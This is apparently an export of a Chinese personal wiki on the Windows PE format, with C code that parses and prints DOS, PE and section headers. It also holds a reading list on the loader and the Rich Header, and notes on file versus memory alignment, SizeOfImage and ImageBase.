按PE结构一步一步解析 DOS头 PE头（Signatur、标准PE头、扩展PE头 节表 注意的点 这部分是编程实现时遇到的，这里统一提一下 printf格式化输出：%X，以大写的十六进制输出；%04X，至少输出4位的大写十六进制数，不足则补0 为文件创建了FileBuffer，FileBuffer起始地址是自己malloc来的一个地址，根据e_lfanew找PE头时，要加上这个FileBuffer的起始地址 PE头起始地址=FileBuffer起始地址+e_lfanew 标准PE头起始地址=FileBuffer起始地址+e_lfanew+4字节（越过Signature） 扩展PE头起始地址=FileBuffer起始地址+e_lfanew+4字节（越过Signature）+标准PE头的大小 节表起始地址=FileBuffer起始地址+e_lfanew+4字节（越过Signature）+标准PE头的大小+标准PE头.SizeOfOptionalHeader 打印节数据的Name字段，Name可能没有结束符 编程实现 打开PE文件创建内存文件映像 为文件创建内存文件映像是为了操作方便，操作文件就像操作内存变量或内存数据一样方便。要不每次都要调整文件指针位置，操作就很繁琐。 函数声明函数实现123456789101112#pragma once#include &lt;stdlib.h&gt; //size_t/* 函数功能：将一个文件读取到malloc分配的内存中，返回在内存中的首地址 input参数： filepath：文件路径 output参数： length：返回文件长度 返回值：该文件在内存中的首地址*/void* ReadFileToFileBuffer(const char* filepath, size_t* length);123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt; //perror fopen fseek ftell fclose#include &lt;stdlib.h&gt; //malloc free size_t#pragma warning(disable:4996) //disable warning of unsafe function fopenvoid* ReadFileToFileBuffer(const char* filepath, size_t* length)&#123; FILE* pFile; void* buffer; // 接malloc返回值 size_t file_size; // 接文件大小 // 打开文件 pFile = fopen(filepath, &quot;rb&quot;); if (pFile == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; // 定位到文件末尾 if (fseek(pFile, 0, SEEK_END) != 0) &#123; perror(&quot;Error seeking to end of file&quot;); fclose(pFile); return NULL; &#125; // 获取文件大小 file_size = ftell(pFile); if (file_size == -1L) &#123; perror(&quot;Error getting file size&quot;); fclose(pFile); return NULL; &#125; // 回到文件开头，后面要用fread读文件的内容 if (fseek(pFile, 0, SEEK_SET) != 0) &#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return NULL; &#125; // 分配内存 buffer = malloc(file_size); if (buffer == NULL) &#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL; &#125; // fread是从当前文件指针开始读取 // 读取文件内容到内存 if (fread(buffer, 1, file_size, pFile) != file_size) &#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL; &#125; // 关闭文件 fclose(pFile); // 如果需要，返回文件大小 if (length != NULL) &#123; *length = file_size; &#125; // 返回内存缓冲区的指针 return buffer;&#125; 判断是否是PE文件 先判断e_magic字段，然后判断PE头的Signature字段。两个都符合，就是有效的PE文件。 ⚠️：根据e_lfanew找PE头时，要加上内存文件映像的地址。 错误的写法1PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)pDosHeader-&gt;e_lfanew; 正确的写法1PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pBuffer + pDosHeader-&gt;e_lfanew); pBuffer是const void*类型，存的是内存地址。地址一个数，转成DWORD，和e_lfanew相加，得到PE头的地址，将这个数强转为PIMAGE_NT_HEADERS32指针类型。 如果不转成DWORD类型，就是指针类型加整数的情况：指针类型+N=，就变成带*类型变量 + N*(去掉一个*后类型的宽度)，这会和我们的预期不符（我们预期是在这个地址的基础上加上pDosHeader-&gt;e_lfanew这个值而已） 函数声明函数实现12345678#pragma once#include &lt;Windows.h&gt;/* 函数功能：判断是否是PE文件 参数：内存地址 返回值：BOOL类型*/BOOL VaildPE(const void* pBuffer);123456789101112131415161718192021222324#include &quot;VaildPE.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL VaildPE(const void* pBuffer)&#123; //判断MZ标志 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; if (IMAGE_DOS_SIGNATURE != pDosHeader-&gt;e_magic) &#123; printf(&quot;It&#x27;s not a vaild MZ Signature &quot;); return FALSE; &#125; //判断PE标记 PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pBuffer + pDosHeader-&gt;e_lfanew); if (IMAGE_NT_SIGNATURE != pImageNTHeaders32-&gt;Signature) &#123; printf(&quot;It&#x27;s not a vaild PE Signature &quot;); return FALSE; &#125; return TRUE;&#125; 按PE结构一步一步解析 DOS头 函数接收文件内存映像基址，然后按字段逐个输出 函数声明函数实现12345678910#pragma once/* 函数功能：打印一个PE文件的DOS MZ头 input参数： pBuffer：文件内存映像基址 返回值：无*/void PrintDosHeader(const void* pBuffer);12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;PrintDosHeader.h&quot;#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;void PrintDosHeader(const void* pBuffer)&#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; printf(&quot;IMAGE_DOS_HEADER-&gt; &quot;); printf(&quot; e_magic: 0x%04X &quot;, pDosHeader-&gt;e_magic); printf(&quot; e_cblp: 0x%04X &quot;, pDosHeader-&gt;e_cblp); printf(&quot; e_cp: 0x%04X &quot;, pDosHeader-&gt;e_cp); printf(&quot; e_crlc: 0x%04X &quot;, pDosHeader-&gt;e_crlc); printf(&quot; e_cparhdr: 0x%04X &quot;, pDosHeader-&gt;e_cparhdr); printf(&quot; e_minalloc: 0x%04X &quot;, pDosHeader-&gt;e_minalloc); printf(&quot; e_maxalloc: 0x%04X &quot;, pDosHeader-&gt;e_maxalloc); printf(&quot; e_ss: 0x%04X &quot;, pDosHeader-&gt;e_ss); printf(&quot; e_sp: 0x%04X &quot;, pDosHeader-&gt;e_sp); printf(&quot; e_csum: 0x%04X &quot;, pDosHeader-&gt;e_csum); printf(&quot; e_ip: 0x%04X &quot;, pDosHeader-&gt;e_ip); printf(&quot; e_cs: 0x%04X &quot;, pDosHeader-&gt;e_cs); printf(&quot; e_lfarlc: 0x%04X &quot;, pDosHeader-&gt;e_lfarlc); printf(&quot; e_ovno: 0x%04X &quot;, pDosHeader-&gt;e_ovno); printf(&quot; e_res[4]: &quot;); int i; for (i = 0; i &lt; 4; i++) &#123; printf(&quot;%04X &quot;, pDosHeader-&gt;e_res[i]); &#125; printf(&quot; &quot;); printf(&quot; e_oemid: 0x%04X &quot;, pDosHeader-&gt;e_oemid); printf(&quot; e_oeminfo: 0x%04X &quot;, pDosHeader-&gt;e_oeminfo); printf(&quot; e_res2[10]: &quot;); for (i = 0; i &lt; 10; i++) &#123; printf(&quot;%04X &quot;, pDosHeader-&gt;e_res2[i]); &#125; printf(&quot; &quot;); printf(&quot; e_lfanew: 0x%08X &quot;, pDosHeader-&gt;e_lfanew);&#125; PE头 PE标识 用内存文件映像基址 or DOS头基址+e_lfanew得到PE头的起始地址，然后打印PE标识 123456//DOS头地址+e_lfanewPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);//pbuffer基址+e_lfanewPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pBuffer + pDosHeader-&gt;e_lfanew); 123//PE标识printf(&quot;IMAGE_NT_HEADERS32-&gt; &quot;);printf(&quot; Signature: 0x%08X &quot;, pImageNTHeaders32-&gt;Signature); 标准PE头 PE中的标准PE头是个结构体IMAGE_FILE_HEADER。怎么打印IMAGE_FILE_HEADER里的各个字段？ 123456typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PE标识 IMAGE_FILE_HEADER FileHeader; // 标准PE头 IMAGE_OPTIONAL_HEADER32 OptionalHeader; // 扩展PE头&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 方式一继续使用pImageNTHeaders32，指向结构体，然后用.访问结构体中的成员，代码如下： 1printf(&quot; Machine: %X &quot;, pImageNTHeaders32-&gt;FileHeader.Machine); 方式二pImageNTHeaders32的值+4，跳过4字节的Signature，就是标准PE头的地址，代码如下： 12PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);printf(&quot; Machine: 0x%04X &quot;, pImageFileHeader-&gt;Machine); 扩展PE头 和标准PE头一样，可以用.访问结构体成员，或用PIMAGE_OPTIONAL_HEADER32指针来访问。 扩展PE头的起始地址：标准PE头起始地址+标准PE头的大小。IMAGE_SIZEOF_FILE_HEADER宏表示了标准PE头的大小。也可以+sizeof(IMAGE_FILE_HEADER) 1PIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER); 函数声明函数实现12345678#pragma once/* 函数功能：打印一个PE文件的PE头：PE标识，标准PE头，扩展PE头 input参数： pBuffer：文件内存映像基址 返回值：无*/void PrintPEHeaders(const void* pBuffer);12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &quot;PrintPEHeaders.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;void PrintPEHeaders(const void* pBuffer)&#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); //PE标识 printf(&quot;-&gt;IMAGE_NT_HEADERS32 &quot;); printf(&quot; Signature: 0x%08X &quot;, pImageNTHeaders32-&gt;Signature); //标准PE头 PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4); printf(&quot;-&gt;IMAGE_FILE_HEADERS32 &quot;); printf(&quot; Machine: 0x%04X &quot;, pImageFileHeader-&gt;Machine); printf(&quot; NumberOfSections: 0x%04X &quot;, pImageFileHeader-&gt;NumberOfSections); printf(&quot; TimeDateStamp: 0x%08X &quot;, pImageFileHeader-&gt;TimeDateStamp); printf(&quot; PointerToSymbolTable: 0x%08X &quot;, pImageFileHeader-&gt;PointerToSymbolTable); printf(&quot; NumberOfSymbols: 0x%08X &quot;, pImageFileHeader-&gt;NumberOfSymbols); printf(&quot; SizeOfOptionalHeader: 0x%04X &quot;, pImageFileHeader-&gt;SizeOfOptionalHeader); printf(&quot; Characteristics: 0x%04X &quot;, pImageFileHeader-&gt;Characteristics); //扩展PE头 PIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER); printf(&quot;-&gt;IMAGE_OPTIONAL_HEADER32 &quot;); printf(&quot; Magic: 0x%04X &quot;, pImageOptionalHeader-&gt;Magic); printf(&quot; MajorLinkerVersion: 0x%02X &quot;, pImageOptionalHeader-&gt;MajorLinkerVersion); printf(&quot; MinorLinkerVersion: 0x%02X &quot;, pImageOptionalHeader-&gt;MinorLinkerVersion); printf(&quot; SizeOfCode: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfCode); printf(&quot; SizeOfInitializedData: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfInitializedData); printf(&quot; SizeOfUninitializedData: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfUninitializedData); printf(&quot; AddressOfEntryPoint: 0x%08X &quot;, pImageOptionalHeader-&gt;AddressOfEntryPoint); printf(&quot; BaseOfCode: 0x%08X &quot;, pImageOptionalHeader-&gt;BaseOfCode); printf(&quot; BaseOfData: 0x%08X &quot;, pImageOptionalHeader-&gt;BaseOfData); printf(&quot; ImageBase: 0x%08X &quot;, pImageOptionalHeader-&gt;ImageBase); printf(&quot; SectionAlignment: 0x%08X &quot;, pImageOptionalHeader-&gt;SectionAlignment); printf(&quot; FileAlignment: 0x%08X &quot;, pImageOptionalHeader-&gt;FileAlignment); printf(&quot; MajorOperatingSystemVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MajorOperatingSystemVersion); printf(&quot; MinorOperatingSystemVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MinorOperatingSystemVersion); printf(&quot; MajorImageVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MajorImageVersion); printf(&quot; MinorImageVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MinorImageVersion); printf(&quot; MajorSubsystemVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MajorSubsystemVersion); printf(&quot; MinorSubsystemVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MinorSubsystemVersion); printf(&quot; Win32VersionValue: 0x%08X &quot;, pImageOptionalHeader-&gt;Win32VersionValue); printf(&quot; SizeOfImage: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfImage); printf(&quot; SizeOfHeaders: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfHeaders); printf(&quot; CheckSum: 0x%08X &quot;, pImageOptionalHeader-&gt;CheckSum); printf(&quot; Subsystem: 0x%04X &quot;, pImageOptionalHeader-&gt;Subsystem); printf(&quot; DllCharacteristics: 0x%04X &quot;, pImageOptionalHeader-&gt;DllCharacteristics); printf(&quot; SizeOfStackReserve: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfStackReserve); printf(&quot; SizeOfStackCommit: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfStackCommit); printf(&quot; SizeOfHeapReserve: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfHeapReserve); printf(&quot; SizeOfHeapCommit: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfHeapCommit); printf(&quot; LoaderFlags: 0x%08X &quot;, pImageOptionalHeader-&gt;LoaderFlags); printf(&quot; NumberOfRvaAndSizes: 0x%08X &quot;, pImageOptionalHeader-&gt;NumberOfRvaAndSizes);&#125; 节表 节表的起始地址=扩展PE头起始地址+标准PE头.SizeOfOptionalHeader 扩展PE头大小可变，最准确的方式看标准PE头.SizeOfOptionalHeader这个值。 12345PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);PIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageOptionalHeader+ pImageFileHeader-&gt;SizeOfOptionalHeader); 节表的数量由标准PE头.NumberOfSections指出，所以要写个循环依次打印每个节表。 12345PIMAGE_SECTION_HEADER pTempImageSectionHeader = pImageSectionHeader;for (int i = 0 ; i &lt; pImageFileHeader-&gt;NumberOfSections; i++, pTempImageSectionHeader++)&#123;\t//打印各字段&#125; Name字段如果超过8个，就没有结束符，不能直接%s。有两种方式解决： 方式一方式二当pName不为空并且在8个字符内，就打印该字符 1234567891011//输出Nameint j = 0;const char* pName = (char*)pTempImageSectionHeader-&gt;Name;while (*pName &amp;&amp; j &lt; 7)&#123;\tprintf(&quot;%c&quot;, *pName);\tpName++;\tj++;&#125;printf(&quot; &quot;);将Name拷到一个长度为9的字符数组SectionName中，然后%s打印该数组 如果字符数&lt;8，原本的Name有结束符，会停下 如果字符数≥8，人为在末尾添加结束符，会停下 123456//输出Name，确保节名称占用8个字符宽度char SectionName[9]; //节名称最大8个字符 + 1个空字符strncpy(SectionName, (const char*)pTempImageSectionHeader-&gt;Name, 8);SectionName[8] = &#x27;\\0&#x27;; // 确保字符串以空字符结尾printf(&quot;%s &quot;, SectionName); 函数声明函数实现12345678#pragma once/* 函数功能：打印一个PE文件的节表 input参数： pBuffer：文件内存映像基址 返回值：无*/void PrintSectionTable(const void* pBuffer);123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &quot;PrintSectionTable.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;void PrintSectionTable(const void* pBuffer)&#123;\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\tprintf(&quot;-&gt;Section Header Table &quot;);\t//输出节表中的字段\tPIMAGE_SECTION_HEADER pTempImageSectionHeader = pImageSectionHeader; //遍历节表用的\tfor (int i = 0 ; i &lt; pImageFileHeader-&gt;NumberOfSections; i++, pTempImageSectionHeader++)\t&#123; printf(&quot; %d. item: &quot;,i); //输出Name printf(&quot; Name: &quot;); int j = 0; const char* pName = (char*)pTempImageSectionHeader-&gt;Name; while (*pName &amp;&amp; j &lt; 7) &#123; printf(&quot;%c&quot;, *pName); pName++; j++; &#125; printf(&quot; &quot;); //输出其他字段 printf(&quot; Misc: 0x%08X &quot;, pTempImageSectionHeader-&gt;Misc.VirtualSize); printf(&quot; VirtualAddress: 0x%08X &quot;, pTempImageSectionHeader-&gt;VirtualAddress); printf(&quot; SizeOfRawData: 0x%08X &quot;, pTempImageSectionHeader-&gt;SizeOfRawData); printf(&quot; PointerToRawData: 0x%08X &quot;, pTempImageSectionHeader-&gt;PointerToRawData); printf(&quot; PointerToRelocations: 0x%08X &quot;, pTempImageSectionHeader-&gt;PointerToRelocations); printf(&quot; PointerToLinenumbers: 0x%08X &quot;, pTempImageSectionHeader-&gt;PointerToLinenumbers); printf(&quot; NumberOfRelocations: 0x%04X &quot;, pTempImageSectionHeader-&gt;NumberOfRelocations); printf(&quot; NumberOfLinenumbers: 0x%04X &quot;, pTempImageSectionHeader-&gt;NumberOfLinenumbers); printf(&quot; Characteristics: 0x%08X &quot;, pTempImageSectionHeader-&gt;Characteristics);\t&#125;&#125;"},{"title":"To Learn List","path":"/wiki/PE/To_Learn_List.html","content":"Res123 起因是双击一个exe后dll的加载顺序问题，引用的想看系统加载器源码 https://chatgpt.com/c/f4d7882a-852f-4f55-9695-0eedf4af6081 搜到的相关文章： https://www.google.com/search?q=LdrpRunInitialize­Routines+Matt+Pietrek's&amp;oq=LdrpRunInitialize­Routines+Matt+Pietrek's&amp;gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDEwNjFqMGoxqAIAsAIA&amp;sourceid=chrome&amp;ie=UTF-8#ip=1 https://learn.microsoft.com/en-us/archive/msdn-magazine/2002/march/windows-2000-loader-what-goes-on-inside-windows-2000-solving-the-mysteries-of-the-loader https://www.cnblogs.com/dubingsky/archive/2009/06/25/1510940.html https://www.cnblogs.com/dubingsky/archive/2009/06/25/1510940.html https://www.cnblogs.com/fwycmengsoft/p/4036569.html https://bbs.kanxue.com/thread-49869-1.htm https://www.cnblogs.com/tinaluo/p/13469325.html 然后知道了一个重写的项目，blackbone 后面研究学习下源码 Rich Header(undocumented) To understand better: https://www.ntcore.com/files/richsign.htm https://0xrick.github.io/win-internals/pe3/ (also a good blog to learn) https://github.com/RichHeaderResearch/RichPE lab: https://github.com/dishather/richprint https://blog.csdn.net/r250414958/article/details/123759371 tools: https://github.com/hasherezade/bearparser may useful: https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/ https://www.youtube.com/watch?v=XX0IW7WuzUo https://bytepointer.com/articles/the_microsoft_rich_header.htm https://www.donationcoder.com/forum/?action=printpage;topic=11956.0 To brows: https://www.pediy.com/kssd/pediy12/125447.html https://stackoverflow.com/questions/13983794/how-to-get-vc-compiler-version-from-pe-file-programmatically https://developercommunity.visualstudio.com/t/add-linker-option-to-strip-rich-stamp-from-exe-hea/740443 https://securelist.com/the-devils-in-the-rich-header/84348/ https://twitter.com/cglyer/status/1182019207627726851 https://www.semanticscholar.org/paper/Leveraging-the-PE-Rich-Header-for-Static-Malware-Dubyk/4af43d4e9b17bb0057448d49fc58ad0552788c17 https://reverseengineering.stackexchange.com/questions/22218/can-i-use-the-rich-header-to-find-out-compiler-and-linker-used http://trendystephen.blogspot.com/2008/01/rich-header.html record: https://dev.to/yumetodo/list-of-mscver-and-mscfullver-8nd"},{"title":"一些概念","path":"/wiki/PE/一些概念_PE.html","content":"PE文件的两种状态 PE文件存在于两个不同的状态：在运行之前，它是存储在磁盘上的一个文件；当运行时，它被加载到内存中。磁盘上的文件和内存中的文件有不同的对齐要求。正是因为这两种状态下的对齐值存在差异，PE文件在从磁盘加载到内存时需要进行调整，这个过程通常被称为“拉伸”。 Section在内存中分配的空间大小 在Section中： 未初始化的数据（如声明了一些全局变量，但没有赋初值），在磁盘中不占有空间，但当这个节载入内存后要给这些数据分配内存空间，随后initialize and use它们。 已初始化的数据（如声明了一些全局变量，并赋了初值），在磁盘中会占有空间。 这意味着一个Secion因为含有未初始化的数据，导致会出现Misc（该节实际的大小）&gt;SizeOfRawData（该区块在磁盘文件中对齐后的大小）的情况出现，那么当该节载入内存后，实际分配的空间是Misc。相反，如果一个Secion的Misc（该节实际的大小）&lt;SizeOfRawData（该区块在磁盘文件中对齐后的大小），那么当该节载入内存后，实际分配的空间是SizeOfRawData。 小结，内存中Section分配的空间为max{Misc,SizeOfRawData}，哪个大按哪个分配。 但在实际操作过程中，编译器编译源文件时会算出这个节将来会在内存中用多大的空间，这会体现在VirtualAddress这个值上。所以当PE文件载入内存时的拉伸，对于节数据的展开，做法是依次对每个节进行拷贝：从PointerToRawData处拷贝SizeOfRawData大小的数据到VirtualAddress。 如果按max{Misc,SizeOfRawData}来拷，可能会因为当前这个节的Misc太大，而拷到下一个节的数据。 （下面这个理论上是，但我改了Misc后就运行不了，未来再考证） 如果我们找一个exe，对那些Misc&gt;SizeOfRawData的节，随意修改Misc的值，该exe也能运行，这就证明了系统加载器拉伸时是按SizeOfRawData拷的。 这样一来，那些未初始化的数据在内存中就有了位置，至于系统加载器后面做的事情，怎么找到这些未初始化的数据，这个目前我无法回答。 对齐值 PE在磁盘上，每个Section要对齐于FileAlignment，即区块的起始地址是FileAlignment的整数倍。 PE在内存中运行时，每个Section要对齐于SectionAlignment，即区块的起始地址是SectionAlignment的整数倍。 之间的间隙，会填充一些无效的字节（padding）。 在学习对齐的过程中，会看到多种说法： xx对齐于xx xx的起始地址能整除于xx xx的大小能整除于xx 其实只要按一条基本的概念就能推导出其他的说法。 FileAlignment：PE文件在磁盘上的区块对齐值。 SizeOfHeaders：DOS头+PE头+节表，按照FileAlignment对齐后的总大小。 PointerToRawData：文件中某个区块在磁盘上的起始偏移地址。 SizeofRawData：磁盘上某个区块对齐后的实际大小。 基于区块起始地址需要对齐，即区块起始地址是文件对齐/内存对齐的整数倍这一基本概念，可以得出以下推论： 由于PE文件第一个节的数据起始地址需要根据FileAlignment进行对齐，可以推断出： DOS头+PE头+节表与第一个节的节数据之间（可能）要有填充 进一步推导出SizeOfHeaders（即DOS头+PE头+节表按照文件对齐后的总大小）必须是FileAlignment的整数倍。 同样地，由于文件中第二个节的起始地址也需要对齐，可以推断出： 在第一个节的数据结束后和第二个节的数据开始前之间有填充 进一步推导出第一个节的SizeofRawData（即该节在磁盘上对齐后的大小）是FileAlignment的整数倍。 … 第n个节数据，PE在内存中按内存对齐同理。 FileAlignment可能和SectionAlignment一样或不一样在计算机技术早期，由于硬件成本较高，硬盘容量有限，文件对齐值（FileAlignment）通常设定为200h，目的是为了节约宝贵的硬盘空间。随着时间的推移，硬件技术进步，人们对硬盘空间的关注减少，编译生成的exe文件的文件对齐值提升到了1000h。这样做的好处是，当exe文件被加载到内存时，其文件对齐值等于节对齐值（SectionAlignment），避免了内存加载时的拉伸过程，从而提高了程序的运行速度。这种做法以牺牲一定的硬盘空间为代价，提升了程序的执行效率，以空间换取了时间。 模块与模块之间的对齐 OD，点击E按钮。可以看到一个exe进程空间中加载的模块。对齐，不仅体现在一个PE文件内部的对齐，PE文件与PE文件之间也有对齐。模块与模块之间的对齐值为10000h，即64k。 观测下64k对齐用OD拖进32位的notepad，找了两个相邻的模块模块名基址大小基址+大小IMM3275610000h26000h75636000hgdi32ful75640000h模块IMM32末尾地址75636000h和下一个模块gdi32ful基址75640000h，之间，填充了4000h。发现模块一和模块二之间确实是按64k对齐，即10000h。换个看法，模块IMM32和模块gdi32ful的基址也是10000h的整数倍。但不清楚为什么对齐值是64k，感觉像个魔数（magic number）。用段式和页式管理的知识也不清楚怎么凑出64k这个数。 “拉伸”的双重含义 个人对拉伸含义进行扩充，这是做FileBufferToImageBuffer那个函数时发现的，我认为把这个知识点加在这里比较好 第一重：PE文件在磁盘上，对齐于FileAlignment，在内存中，对齐于SectionAlignment。因为两者的差异，当一个PE文件由磁盘载入到内存，需要做“拉伸”。 第二重：节数据中未初始化数据的“拉伸”展开。如果一个PE文件中的某个节数据因为含有未初始化的数据（如.bss节，或.bss已合并到.data节中）导致出现VitrualSize&gt;SizeOfRawData的情况。这部分未初始化的数据在文件中不占用空间，而在内存中要占有空间，也就是说系统加载器在内存中要给这些未初始化的数据，分空间，这样会使ImageBufer的大小&gt;FileBuffer的大小，也导致了“拉伸” 思考过程试想一下，如果一个PE文件FileAlignment==SectionAlignment，是否就不需要“拉伸”了，载入内存时的ImageBufer是否就和文件FileBuffer一样了？例1：飞鸽程序例2：VS编译出的Hello World程序例3：VC编译出的Hello World程序飞鸽的FileAlignment和SectionAlignment都是1000h。然后我们看节表，观察它各个节的信息4个节的VirtualSize均&lt;SizeOfRawData，4个节的VirtualAddress==PointerToRawData。这说明ImageBuffer没有一点拉伸，ImageBuffer的大小和FileBuffer大小一样。通过SizeOfImage字段可以验证猜想：用VS编译如下代码生成的exe，这个exe中有一个完全不占磁盘空间的节。1234567#include &lt;stdio.h&gt;int main()&#123;\tprintf(&quot;Hello World! &quot;);\treturn 0;&#125;.textbss节，文件中起始地址PointerToRawData为0，SizeOfRawData为0。但到内存中这个节要用10000h大小的空间，编译器编译时就算好了每个节的VirtualAddress，在这里例子中就是划定了从内存VirtualAddress(1000h)开始，给那么多的空间给.textbss节用。随后下一个节，.text节从VirtualAddress（11000h）作为起始地址。你看，这是因为含有未初始化数据，在文件中不占用空间，但是到内存中，需要分配大小给这些数据，而导致的拉伸。不过这个exe的FileAlignment是200h，SectionAlignment是1000h，如果相等，这个例子就完美了，能看出因为节而导致的“拉伸”。更常见的情况，是后面的例3，.bss节的数据合并到另一个节中，导致那个节的Misc&gt;SizeOfRawData，即内存实际要用的空间比在磁盘上的多。用VC6编译如下代码生成的exe，FileAlignment和SectionAlignment都是1000h。然后我们看节表，观察它各个节的信息1234567#include &lt;stdio.h&gt;int main()&#123;\tprintf(&quot;Hello World! &quot;);\treturn 0;&#125;依次从上往下看，.text节、.rdata节的VirtualSize&lt;SizeOfRawData，因此VitrualAddress和PointerToRawData一样。但是.data节，由于VirtualSize&gt;SizeOfRawData，导致.idata节的VirtualSize就比PointerToRawData大了。（因为.data占的地更多了，导致.data的节数据起始地址就变高了。）并且会持续影响到后面节的起始地址。即使.reloc节的VirtualSize&lt;SizeOfRawData，.reloc节数据的VirtualAddress还是&gt;PointerToRawData。现在用最后一个节.reloc的起始地址VirtualAddress，2B000+SizeOfRawData，按内存对齐，得到的值是2C000，也就是说ImageBuffer的大小至少是2C000。用PE Tool看下SizeOfImage字段：刚好是2C000比文件大小的值大，而这个文件的FileAlignment=SectionAlignment，但从FileBuffer-&gt;ImageBuffer还是拉伸了，因为某些节含有未初始化数据的导致Misc&gt;SizeOfRawData的原因。 一些字段 SizeOfImage的大小≥最后一个节.VirtualAddress+max&#123;Misc,SizeOfRawData&#125;按内存对齐后的值 要不这个PE文件载入内存时因为空间大小申请错误，没法拉伸，也就没法运行 实验：改这个值默认，未修改改大改小默认是2C000由2C000改大，改为2D000由2C000改小，改为2B000 ImageBase+AddressOfEntryPoint 扩展PE头中有两个字段： AddressOfEntryPoint：程序执行入口RVA，指PE文件在内存拉伸展开后，程序从哪个地址开始执行。这个值是相对于ImageBase的偏移。 ImageBase：内存镜像基址。指PE文件在内存中首选在哪个地址开始载入拉伸。 当用户双击一个PE文件以运行一个程序时，系统会创建一个新的进程。每个进程都拥有一个独立的4GB的地址空间，其中上半部分（高2GB）是由操作系统所使用，而下半部分（低2GB）是分配给用户空间的。程序是无法直接访问操作系统所占用的高2GB空间的。在进程创建时，ImageBase字段定义了PE文件应当从哪个内存地址开始被加载和映射。一旦系统加载器完成了加载和映射工作，它会根据PE文件中的AddressOfEntryPoint字段指定的位置，跳转到代码区并开始执行程序代码。 一个PE文件加载到进程空间中，ImageBase可能被其他PE文件占用，那就要换一个地址载入。这也是为什么一些值比如AddressOfEntryPoint是设计成相对于ImageBase的偏移，而不能直接写成绝对地址VA。 实验 